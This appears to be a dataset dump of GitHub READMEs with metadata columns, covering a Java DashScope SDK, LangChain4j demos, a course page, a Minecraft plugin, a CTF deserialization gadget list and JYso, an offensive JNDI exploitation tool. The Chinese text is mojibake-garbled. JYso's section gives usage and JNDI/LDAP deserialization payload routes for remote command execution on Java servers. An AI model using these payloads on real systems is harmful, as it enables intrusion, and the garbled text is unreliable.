4364013672,-0.017357468605041504,-0.002869844436645508,0.01861572265625,-0.02283334732055664,0.008321762084960938,-0.0009095668792724609,-0.0020166486501693726,0.009437084197998047,0.024478912353515625,0.0069217681884765625,0.026760101318359375,-0.019593238830566406,-0.042789459228515625,0.04044198989868164,0.014730453491210938,-0.025165557861328125,-0.006939888000488281,-0.01203155517578125,0.0034481287002563477,-0.015842437744140625,-0.025133132934570312,-0.020143508911132812,0.0173797607421875,-0.00859832763671875,0.01553964614868164,-0.017887115478515625,-0.024831771850585938,0.010150909423828125,-0.021881103515625,-0.0167999267578125,0.011527061462402344,-0.0034637451171875,-0.008426189422607422,-0.024639129638671875,-0.029087066650390625,-0.012368202209472656,0.01458740234375,-0.0134429931640625,-0.024379730224609375,-0.02133941650390625,-0.008868217468261719,0.011730670928955078,0.002190113067626953,-0.003635406494140625,-0.000522613525390625,0.0004253387451171875,-0.02270030975341797,-0.010772228240966797,-0.017958641052246094,0.017289161682128906,0.006549239158630371,-0.017750918865203857,0.008399009704589844,0.0003490447998046875,0.0046291351318359375,-0.015466690063476562,-0.00736236572265625,0.01204681396484375,0.017610549926757812,0.013065338134765625,0.01569366455078125,0.0016980171203613281,0.025362133979797363,0.01245570182800293,0.02231121063232422,-0.016411781311035156,0.009354591369628906,0.0007534027099609375,-0.0071258544921875,-0.033690452575683594,-0.018520355224609375,0.018801212310791016,-0.012007713317871094,-0.030857086181640625,-0.005173683166503906,0.013844490051269531,0.003353297710418701,-0.019059181213378906,-0.016803741455078125,-0.002732515335083008,0.016240954399108887,0.0010290145874023438,0.026058197021484375,-0.0008764266967773438,0.004401206970214844,-0.00554656982421875,-0.011745452880859375,-0.0011081695556640625,0.0005931854248046875,-0.00217437744140625,0.010144233703613281,-0.02487945556640625,-0.012645721435546875,0.009256482124328613,-0.004539966583251953,-0.01030731201171875,0.017576277256011963,0.02353668212890625,0.006230354309082031,0.006053924560546875,0.011409759521484375,-0.011490345001220703,-0.01616954803466797,0.009822845458984375,-0.012165069580078125]},""usage"":{""image"":{""measure"":1,""weight"":1},""total_usage"":5,""audio"":{""measure"":1,""weight"":2},""text"":{""measure"":2,""weight"":1}},""request_id"":""2eeb465c-9081-9cd6-a650-74fbd54ebe89""}
```

### æ”¯æŒæ‹¦æˆªAPIè°ƒç”¨

é€šè¿‡`DashScopeClient.Builder`è®¾ç½®ï¼Œå¯å®ç°AOPçš„åŠŸèƒ½ï¼Œé™æµæ§åˆ¶ã€å¤±è´¥é‡è¯•ç­‰åŠŸèƒ½å‡åŸºäºæ­¤å®ç°ã€‚

ç¤ºä¾‹ä»£ç 

```java
DashScopeClient client = DashScopeClient.newBuilder()
    .ak(AK)
    .executor(executor)
    .appendInterceptors(List.of(
        new Interceptor() {

            @Override
            public CompletableFuture<?> handle(InvocationContext context, ApiRequest<?> request, OpHandler opHandler) {
                return opHandler.handle(request);
            }

        }
    ))
    .build();
```

### æ”¯æŒæ— æ„Ÿä½¿ç”¨ä¸´æ—¶ç©ºé—´

åœ¨`å¯¹è¯`ã€`å¤šæ¨¡æ€å‘é‡è®¡ç®—`å’Œ`æ–‡æ¡£åˆ†ææ’ä»¶`ç­‰è¯·æ±‚ä¸­å¦‚æœéœ€è¦è§£æå›¾ç‰‡ã€éŸ³é¢‘ã€æ–‡æ¡£ç­‰å†…å®¹ï¼Œä¸å†éœ€è¦æå‰ä¸Šä¼ åˆ°OSSè½¬æ¢ä¸ºå¤–ç½‘å¯è®¿é—®çš„URLè¿æ¥ã€‚è¿™æ ·æä¸æ–¹ä¾¿ä¹Ÿä¸å®‰å…¨ã€‚

é€šè¿‡çµç§¯å¹³å°æä¾›çš„[ä¸´æ—¶ç©ºé—´](https://help.aliyun.com/zh/dashscope/developer-reference/guidance-of-temporary-storage-space)
å¯ä»¥å¾ˆå¥½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ“ä½œèµ·æ¥éœ€è¦è°ƒç”¨é¢å¤–çš„apiä¸”éœ€è¦å¯¹urlè¿›è¡Œæ‹¼æ¥å’Œæ›¿æ¢ï¼Œç•¥ä¸ºç¹çã€‚

dashscope4jå¸®ä½ å°è£…äº†è¿™ä¸ªç¹ççš„æ“ä½œï¼Œä½ åªéœ€è¦è®¾ç½®å†…å®¹çš„æ—¶å€™å°†æœ¬åœ°æ–‡ä»¶ç›´æ¥ä¼ å…¥Contentï¼Œæ¡†æ¶ä¼šè‡ªåŠ¨è¯†åˆ«å¹¶å¸®ä½ å®Œæˆä¸´æ—¶ç©ºé—´ä¸Šä¼ å’Œè½¬æ¢è¿æ¥æ“ä½œã€‚å¹¶è‡ªå¸¦ä¸€ä¸ªç¼“å­˜é¿å…é‡å¤ä¸Šä¼ ã€‚

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_VL_MAX)
    .option(ChatOptions.ENABLE_INCREMENTAL_OUTPUT, true)
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofImage(new File(""./document/image/image-002.jpeg"").toURI()),
            Content.ofText(""å›¾ç‰‡ä¸­ä¸€å…±å¤šå°‘è¾†è‡ªè¡Œè½¦?"")
        ))
    ))
    .build();
```

## äº”ã€å‚ä¸è´¡çŒ®

å¦‚æœä½ å¯¹`DashScope4j`æ„Ÿå…´è¶£å¹¶å¸Œæœ›ä¸ºå…¶åšå‡ºè´¡çŒ®ï¼Œè¯·éµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š

1. Forkæœ¬é¡¹ç›®åˆ°ä½ çš„GitHubè´¦æˆ·ã€‚
2. å…‹éš†é¡¹ç›®åˆ°ä½ çš„æœ¬åœ°ç¯å¢ƒã€‚
3. åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ç”¨äºä½ çš„ä¿®æ”¹ã€‚
4. æäº¤ä½ çš„æ›´æ”¹å¹¶é€šè¿‡`Pull Request`è¯·æ±‚åˆå¹¶åˆ°ä¸»åˆ†æ”¯ã€‚

åœ¨æäº¤Pull Requestä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ çš„ä»£ç ç¬¦åˆé¡¹ç›®çš„ç¼–ç è§„èŒƒå’Œæœ€ä½³å®è·µï¼Œå¹¶ä¸”å·²ç»é€šè¿‡äº†ç›¸å…³çš„æµ‹è¯•ã€‚

## å…­ã€å…³äºè½¯ä»¶

### ç‰ˆæœ¬å·å£°æ˜

è½¯ä»¶ç‰ˆæœ¬å·é‡‡ç”¨ï¼š`å¤§ç‰ˆæœ¬`.`å°ç‰ˆæœ¬`.`æ¼æ´ä¿®å¤`çš„æ ¼å¼

- **å¤§ç‰ˆæœ¬ï¼š** ç¨‹åºçš„æ¶æ„è®¾è®¡è¿›è¡Œé‡å¤§å‡çº§æˆ–é‡å¤§æ”¹é€ 

- **å°ç‰ˆæœ¬ï¼š**
    1. å¢åŠ æ–°çš„APIåŠŸèƒ½
    2. åœ¨ç°æœ‰æ¶æ„ä¸‹å®Œæˆå±€éƒ¨æ¶æ„çš„å¾®è°ƒ

- **æ¼æ´ä¿®å¤ï¼š** åœ¨ä¸æ”¹å˜ç°æœ‰æ¶æ„å’ŒAPIæƒ…å†µä¸‹ï¼Œå¯¹æ¼æ´ä¿®å¤å’Œå¢å¼º

### å†™åœ¨æœ€å

çµç§¯æ˜¯æœ‰å®˜æ–¹çš„Javaå®¢æˆ·ç«¯çš„ï¼Œæˆ‘ä¹‹æ‰€ä»¥è¿˜éœ€è¦å¼€å‘è¿™ä¸ª`DashScope4j`ä¸»è¦æ˜¯åŸºäºä»¥ä¸‹å‡ ç‚¹è€ƒè™‘

1. å®˜æ–¹çš„SDKå¹¶ä¸å¼€æºï¼Œä½ æ— æ³•æŸ¥çœ‹å…¶æºç ï¼Œä¹Ÿæ— æ³•è‡ªè¡Œä¿®æ”¹å’Œå®šåˆ¶
2. ä¸ªäººç»ƒæ‰‹ä¹ æƒ¯ï¼Œåæ­£ä¹Ÿä¸èŠ±æˆ‘å¤šå°‘æ—¶é—´ï¼Œå—¯å—¯

## ä¸ƒã€ç›¸å…³é“¾æ¥

- [æ¨¡å‹æœåŠ¡-çµç§¯](https://dashscope.aliyun.com)
- [å¸®åŠ©æ–‡æ¡£-çµç§¯](https://help.aliyun.com/zh/dashscope/)
",7,2,2,8.0,"['java', 'sdk', 'tokenizer']","['java', 'sdk', 'tokenizer']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
LxxxSec/CTF-Java-Gadget,master,"# CTF-Java-Gadget

## å‰è¨€

CTF-Java-Gadgetä¸“æ³¨äºæ”¶é›†CTFä¸­Javaèµ›é¢˜çš„ååºåˆ—åŒ–ç‰‡æ®µï¼Œé¡¹ç›®åœ°å€ï¼š

- https://github.com/LxxxSec/CTF-Java-Gadget

å¦‚æœ‰æ–°é“¾ï¼ˆæˆ–ç‰‡æ®µï¼‰æƒ³è¦æ·»åŠ è‡³ CTF-Java-Gadget é¡¹ç›®ï¼Œå¯æäº¤è‡³issueï¼

## ä½¿ç”¨æ–¹æ³•

å‚è€ƒ [CTF-Java-Gadget.pdf](./CTF-Java-Gadget.pdf)

## ChangeLog

20240828

-   [x] æ·»åŠ  HashMap#readObject -> UIDefaults$TextAndMnemonicHashMap -> toString é“¾

20240826

-   [x] æ·»åŠ  CodeSigner#toString -> exec é“¾ï¼ˆæ¥æºï¼šhttps://www.n1ght.cn/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/ï¼‰

20240812

-   [x] æ·»åŠ  JtaTransactionManager#readObject -> JNDI é“¾

20240319

-   [x] å…¬å¼€ CTF-Java-Gadget é¡¹ç›®
",0,0,1,0.0,['changelog'],['changelog'],1.0,[],0.0,1.0,0.0
marcushellberg/java-chat-with-documents,main,"# Java AI chatbot that uses your documents as context 

This app demonstrates how you can create a custom AI chatbot that can use your own documents to answer questions using RAG (retrieval augmented generation).
The chatbot uses [LangChain4j](https://github.com/langchain4j/langchain4j) and the OpenAI API to generate responses and [Vaadin](http://vaadin.com/) to create the user interface.

> [!IMPORTANT]
> Before you can use the application you need to:
> 1. Configure the documentation location
> 2. Configure either OpenAi or a local LLM

## ğŸ› ï¸ Configuration

### Configuring documentation location

Update the `docs.location` property in `application.properties` to point to a folder with relevant documents. 
LangChain4j uses Apache Tika internally when processing the files, so most file types work.

### Using Open AI

OpenAI gives you better quality answers but requires you to send data to a 3rd party.

To use OpenAI, get an [API key](https://platform.openai.com/api-keys) and configure it in `application.properties`. 
Optionally, you can also configure the model in the properties. 

### Using a local LLM

Using a local model allows you to keep your data on your local computer, but the quality of answers will not be as good as with OpenAI.

Install [Ollama](https://ollama.com/) and the `llama3` model.
Comment out the OpenAI section of `application.properties` and uncomment the Ollama section.

### Optional: Embedding store (Vector DB)

By default, the application uses an in-memory embedding store. This is fine for demos and small amounts of data. 
If you need to store more documents, consider using any of the [embedding stores that LangChain4j supports](https://docs.langchain4j.dev/integrations/embedding-stores/).

## â–¶ï¸ Running the application

The project is a standard Maven project. To run it from the command line,
type `mvnw` (Windows), or `./mvnw` (Mac & Linux), then open
http://localhost:8080 in your browser.

You can also import the project to your IDE of choice as you would with any
Maven project. Read more on [how to import Vaadin projects to different IDEs](https://vaadin.com/docs/latest/guide/step-by-step/importing) (Eclipse, IntelliJ IDEA, NetBeans, and VS Code).
",0,0,2,2.0,"['java', 'ai', 'chatbot', 'use', 'document', 'context', 'configuration', 'configure', 'documentation', 'location', 'use', 'open', 'ai', 'use', 'local', 'llm', 'optional', 'embedding', 'store', 'vector', 'db', 'run', 'application']","['use', 'ai', 'java', 'chatbot', 'document']",1.0,"[com.vaadin:vaadin-maven-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
EmbarkXOfficial/spring-boot-course,main,"This is the Official repository of **Java Spring Boot: Professional eCommerce Project Masterclass** on Udemy

# The Ultimate Java and Spring Boot Mastery

Welcome to your one-stop-shop for mastering Java and Spring Boot! This repository offers a comprehensive learning experience with high-quality resources and community support. Dive into over 23+ hours of premium content, with everything you need to excel at Java and Spring Boot development.

## ğŸ“ Learning Roadmap

Most of the courses below are available in **Udemy For Business**, so if you have subscription - you can get FREE access.
Hereâ€™s a structured path to enhance your skills with detailed courses available:

1. **[Spring Boot By Building Complex Projects Step by Step](https://link.embarkx.com/spring-boot) (47+ Hours of Content)**
2. **[Master Spring Boot Microservices](https://link.embarkx.com/microservices) (23+ Hours of Content)**
3. **[Learn Java with 60+ Hours of Content](http://link.embarkx.com/java) (60+ Hours of Content)**
4. **[Master Spring Security with React JS + OAuth2](https://link.embarkx.com/spring-security) (23+ Hours of Content)**
5. **[Master IntelliJ IDEA](http://link.embarkx.com/intellij) (3+ Hours of Content)**


## ğŸŒŸ With All Our Courses You Gain Access To

- ğŸ“ **Notes:** Detailed and downloadable notes to accompany each lesson.
- ğŸ’» **Source Code:** Full access to the source code used in the tutorials.
- ğŸ¤” **Doubt Solving:** Responsive instructor and community support.
- ğŸ¥ **High-Quality HD Videos:** Easy to understand, high-definition video tutorials.
- ğŸ”„ **Free Lifetime Updates:** Continuous updates to course content at no extra cost.

## ğŸ“š Why Choose This Mastery Series?

With this series, you're not just learning; you're preparing to dominate the field of Java and Spring Boot development. Our structured learning path ensures that you build your skills progressively, with each course designed to build on the knowledge gained from the previous one.

### Join Us Now!

Start your journey today to become a master at Java and Spring Boot. Our community and expert instructors are here to support your learning every step of the way. **Enroll and start building your future, today!**





# Usage Policy for Course Materials

## Instructor Information

**Instructor:** Faisal Memon  
**Company:** [EmbarkX.com](http://www.embarkx.com)

## Policy Overview

This document outlines the guidelines and restrictions concerning the use of course materials provided by EmbarkX, including but not limited to PDF presentations, code samples, and video tutorials.

### 1. Personal Use Only

The materials provided in this course are intended for **your personal use only**. They are to be used solely for the purpose of learning and completing this course.

### 2. No Unauthorized Sharing or Distribution

You are **not permitted** to share, distribute, or publicly post any course materials on any websites, social media platforms, or other public forums without prior written consent from the instructor.

### 3. Intellectual Property

All course materials are protected by copyright laws and are the intellectual property of Faisal Memon and EmbarkX. Unauthorized use, reproduction, or distribution of these materials is **strictly prohibited**.

### 4. Reporting Violations

If you become aware of any unauthorized sharing or distribution of course materials, please report it immediately to [embarkxofficial@gmail.com](mailto:embarkxofficial@gmail.com).

### 5. Legal Action

We reserve the right to take legal action against individuals or entities found to be violating this usage policy.

## Thank You

Thank you for respecting these guidelines and helping us maintain the integrity of our course materials.

## Contact Information

- **Email:** [embarkxofficial@gmail.com](mailto:embarkxofficial@gmail.com)
- **Website:** [www.embarkx.com](http://www.embarkx.com)

",0,0,1,0.0,"['the', 'ultimate', 'java', 'spring', 'boot', 'mastery', 'learning', 'roadmap', 'with', 'all', 'our', 'course', 'you', 'gain', 'access', 'to', 'why', 'choose', 'this', 'mastery', 'series', 'join', 'u', 'now', 'usage', 'policy', 'course', 'material', 'instructor', 'information', 'policy', 'overview', 'personal', 'use', 'only', 'no', 'unauthorized', 'sharing', 'distribution', 'intellectual', 'property', 'report', 'violation', 'legal', 'action', 'thank', 'you', 'contact', 'information']","['mastery', 'course', 'you', 'policy', 'information']",4.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,4.0,0.0
jdubois/jdubois-langchain4j-demo,main,"# LangChain4J demo

_Author: [Julien Dubois](https://www.julien-dubois.com)_

## Goal

This is a Spring Boot project that demonstrates how to use LangChain4J to create Java applications using LLMs.

It contains the following demos:

- How to generate an image using Dalle-3.
- How to generate a text using GPT-4o, GPT-4o-mini, Phi-3.5 and tinyllama.
- How to use a chat conversation with memory of the context.
- How to ingest data into a vector database, and use it.
- How LangChain4J's ""Easy RAG"" works, and a complete example using it.

Those demos either run locally (with Docker, using Ollama and Qdrant) or in the cloud (using Azure OpenAI or GitHub Models, and Azure AI Search).

## Slides

2 slide decks are available to detail this demo:

- [An introduction to LangChain4J](LangChain4J%20intro.pdf): a quick overview of LangChain4J
- [EasyRAG with LangChain4J](LangChain4J%20EasyRAG%20demo.pdf): a focus on demos 10 and 11, detailing the RAG pattern with LangChain4J

## Configuration

There are 4 Spring Boot profiles, so you can test the demos with different configurations, tools and models.

### _Option 1_ : Running in the cloud with Azure

This configuration uses:

- __Chat Model__: Azure OpenAI with gpt-4o
- __Image Model__: Azure OpenAI with dalle-3
- __Embedding model__: Azure OpenAI with text-embedding-ada
- __Embedding store__: Azure AI Search

It is enabled by using the `azure` Spring Boot profile.
One way to do this is to set `spring.profiles.active=azure` in the `src/main/resources/application.properties` file.

To provision the Azure resources, you need to run the `src/main/script/deploy-azure-openai-models.sh` script. It will create the following resources:

- An Azure OpenAI instance, with the necessary OpenAI models for this demo.
- An Azure AI Search instance.

At the end of this script, the following environment variables will be displayed (and stored in the `.env` file), and you will need them to run the application:
- `AZURE_OPENAI_ENDPOINT`: your Azure OpenAI URL endpoint.
- `AZURE_OPENAI_KEY`: your Azure OpenAI API key.
- `AZURE_SEARCH_ENDPOINT`: your Azure AI Search URL endpoint.
- `AZURE_SEARCH_KEY`: your Azure AI Search API key.

### _Option 2_ : Fully local, not very good, but small and fast

This configuration uses:

- __Chat Model__: Ollama with tinyllama
- __Image Model__: Not available
- __Embedding model__: in-memory Java with AllMiniLmL6V2EmbeddingModel
- __Embedding store__: Qdrant

It is enabled by using the `small` Spring Boot profile.
One way to do this is to set `spring.profiles.active=small` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-small.yml` file.

It will set up:

- An Ollama instance, with the tinyllama model.
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 3_ : Fully local, not very fast, but with good quality

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Qdrant

It is enabled by using the `good` Spring Boot profile.
One way to do this is to set `spring.profiles.active=good` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-good.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models. Its Web UI is available at [http://localhost:8081/](http://localhost:8081/).
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 4_ : GitHub Models

GitHub Models are available [here](https://github.com/marketplace/models).

This configuration uses:

- __Chat Model__: GitHub Models with gpt-4o-mini
- __Image Model__: Not available
- __Embedding model__: GitHub Models with text-embedding-3-small
- __Embedding store__: Qdrant

It is enabled by using the `github` Spring Boot profile.
One way to do this is to set `spring.profiles.active=github` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-github.yml` file.

It will set up:

- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

For accessing GitHub Models, you'll need an environment variable named `GITHUB_TOKEN` with a GitHub token that grants permission to access the models.

## Running the demos

Once the resources (Azure or local) are configured, you can run the demos using the following command:

```shell
./mvnw spring-boot:run
```

Then you can access the base URL, where you find the Web UI: [http://localhost:8080/](http://localhost:8080/).

The demos are available in the top menu.
",0,0,3,2.0,"['demo', 'goal', 'slide', 'configuration', 'run', 'cloud', 'azure', 'fully', 'local', 'good', 'small', 'fast', 'fully', 'local', 'fast', 'good', 'quality', 'github', 'model', 'run', 'demo']","['demo', 'run', 'fully', 'local', 'good']",1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
CASELOAD7000/knockback-sync,main,"Minecraft doesnâ€™t factor in network latency when determining a player's actions on the server.
This causes the server to receive outdated information that doesnâ€™t reflect the player's clientside position.
As a result, players take negative velocity when they're on the ground clientside, but not serverside.

This plugin handles knockback as if it were calculated clientside, ensuring that no player is at a disadvantage,
regardless of their own or their opponentâ€™s connection.

Showcase: https://www.youtube.com/watch?v=SVokpr3v-TA

Official Discord: https://discord.gg/nnpqpAtyVW

## Frequently Asked Questions (FAQ)

### Does this change put high ping players at a disadvantage?
**It depends on the player.** Some may notice a difference if they're used to relying on high ping to reduce knockback. For others, it could actually be an advantage.

### How does this change benefit high ping players?
**Knockback control.** For example, it will be easier to escape crit chains and punish crit.

### Why was the configurability of ping offset removed?
**It promotes consistency across all servers.** Extensive testing with top players has shown that an offset of 25 provides a balanced experience for everyone.

### How do I change the ping offset?
**You must run a modified build of KnockbackSync.** The variable can be changed inside of the [PlayerData](src/main/java/me/caseload/knockbacksync/manager/PlayerData.java) class.

## License
GNU General Public License v3.0 or later

See [COPYING](COPYING) to see the full text.
",3,4,1,8.0,"['frequently', 'ask', 'question', 'faq', 'do', 'change', 'put', 'high', 'ping', 'player', 'disadvantage', 'how', 'change', 'benefit', 'high', 'ping', 'player', 'why', 'configurability', 'ping', 'offset', 'remove', 'how', 'i', 'change', 'ping', 'offset', 'license']","['ping', 'change', 'high', 'player', 'how']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
Gary-yang1/JYso,main,"# 1 JNDIExploit ç”¨æ³•

```payloadä¸åŒºåˆ†å¤§å°å†™```

ä½¿ç”¨ ```java -jar JYso-[version].jar --jndi -h``` æŸ¥çœ‹å‚æ•°è¯´æ˜ï¼Œå…¶ä¸­ ```--ip``` å‚æ•°ä¸ºå¿…é€‰å‚æ•°

```
Usage: java -jar JYso-[version].jar --jndi [options]
  Options:
  * -i,  --ip       Local ip address  (default: 127.0.0.1)
    -rP, --rmiPort  rmi bind port (default: 1099)
    -lP, --ldapPort Ldap bind port (default: 1389)
    -hP, --httpPort Http bind port (default: 3456)
    -g,  --gadgets  Show gadgets (default: false)
    -c,  --command  RMI this command
    -h,  --help     Show this help
    -ak  --AESkey   AES+BAse64 decryption of routes
    -u   --user     ldap bound account
    -p   --PASSWD   ldap binding password
    --jndi          start JNDImode
```

+ ä¸€èˆ¬å¯åŠ¨ç¤ºä¾‹

```
java -jar JYso-[version].jar --jndi -i 127.0.0.1
```

+ éœ€è¦è´¦å·å¯†ç è®¤è¯çš„æƒ…å†µä¸‹

```shell
java -jar JYso-[version].jar --jndi -i 127.0.0.1 -u ""dc=ex"" -p ""123456""
```

+ å¯¹äºBCELè¿™ç§è¶…é•¿è¯·æ±‚ï¼Œå¯ä»¥ä»httpå¤„å–å‚ï¼Œæ¥å‡å°‘è¯·æ±‚é•¿åº¦

å…ˆå‘httpè¯·æ±‚å‚æ•°ï¼Œåœ¨å‘jndi payload

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections6/sethttp
```

```shell
http://127.0.0.1:3456/setPathAlias?a=whoami
```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230705100008.png)

+ å¯¹è·¯ç”±åŠ å¯†åæº¯æºï¼Œå¯åŠ¨æ—¶éœ€è¦æŠŠ AESkey åŠ ä¸Š

```
java -jar JYso-2.6.jar --jndi -i 127.0.0.1 -ak 3yWm2mOpXudIPTqM
```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230704215102.png)

<details>
  <summary>ç”¨æ¥åŠ å¯†çš„JAVAä»£ç </summary>


```java
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Main {
    private static final String ALGORITHM      = ""AES"";
    private static final String TRANSFORMATION = ""AES/CBC/PKCS5Padding"";
    private static final int    KEY_SIZE       = 16; // 128 bits

    public static String encodeBase64(String text) {
        byte[] encodedBytes = Base64.getEncoder().encode(text.getBytes());
        return new String(encodedBytes);
    }

    public static String encrypt(String plaintext, String key) throws Exception {
        byte[] ivBytes  = generateIV();
        byte[] keyBytes = getKeyBytes(key);

        SecretKeySpec   secretKeySpec = new SecretKeySpec(keyBytes, ALGORITHM);
        IvParameterSpec ivSpec        = new IvParameterSpec(ivBytes);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec);

        byte[] encryptedBytes = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
        byte[] combinedBytes  = new byte[ivBytes.length + encryptedBytes.length];
        System.arraycopy(ivBytes, 0, combinedBytes, 0, ivBytes.length);
        System.arraycopy(encryptedBytes, 0, combinedBytes, ivBytes.length, encryptedBytes.length);

        return Base64.getEncoder().encodeToString(combinedBytes);
    }

    private static byte[] generateIV() {
        byte[] ivBytes = new byte[KEY_SIZE];
        // Generate random IV bytes
        // Replace with a secure random generator if possible
        for (int i = 0; i < ivBytes.length; i++) {
            ivBytes[i] = (byte) (Math.random() * 256);
        }
        return ivBytes;
    }

    private static byte[] getKeyBytes(String key) {
        byte[] keyBytes      = new byte[KEY_SIZE];
        byte[] passwordBytes = key.getBytes(StandardCharsets.UTF_8);
        System.arraycopy(passwordBytes, 0, keyBytes, 0, Math.min(passwordBytes.length, keyBytes.length));
        return keyBytes;
    }
    public static void main(String[] args) {
        try {
            String plaintext = ""Deserialization/CommonsCollections6/command/Base64/d2hvYW1p"";
            String key = ""3yWm2mOpXudIPTqM"";

            String ciphertext = encrypt(plaintext, key);
            String encodedText = encodeBase64(ciphertext);
            System.out.println(""Base64 Encoded Text: "" + encodedText);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

</details>

+ å¯¹äºè·¯ç”±å®Œå…¨ä¸å¯æ§çš„æƒ…å†µä¸‹ï¼Œä»httpå¤„è·å–

```shell
jndi:ldap://127.0.0.1:1389/
```

```shell
http://127.0.0.1:3456/setRoute?a=Deserialization/CommonsCollections6/command/Base64/d2hvYW1p
```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230706103914.png)

* ç›®å‰æ”¯æŒçš„æ‰€æœ‰ ```Echo``` ä¸º
  * ```Bypass```: ç”¨äºrmiæœ¬åœ°å·¥å‚ç±»åŠ è½½ï¼Œé€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```TomcatEcho```: ç”¨äºåœ¨ä¸­é—´ä»¶ä¸º ```Tomcat``` æ—¶å‘½ä»¤æ‰§è¡Œç»“æœçš„å›æ˜¾ï¼Œé€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami```
    çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```SpringEcho```: ç”¨äºåœ¨æ¡†æ¶ä¸º ```SpringMVC/SpringBoot```
    æ—¶å‘½ä»¤æ‰§è¡Œç»“æœçš„å›æ˜¾ï¼Œé€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```JbossEcho```: Jboss å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```WeblogicEcho```: weblogic å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```WebsphereEcho```: websphere å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```ResinEcho```: Resin å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```JettyEcho```: Jetty7,8,9ç‰ˆæœ¬å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```WindowsEcho```: Windows å‘½ä»¤æ‰§è¡Œå›æ˜¾, åªæ‰§è¡Œäº†whoami
  * ```Struts2Echo```: Struts2 å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```LinuxEcho1```: Linux å‘½ä»¤æ‰§è¡Œå›æ˜¾, åªæ‰§è¡Œäº†idï¼Œ
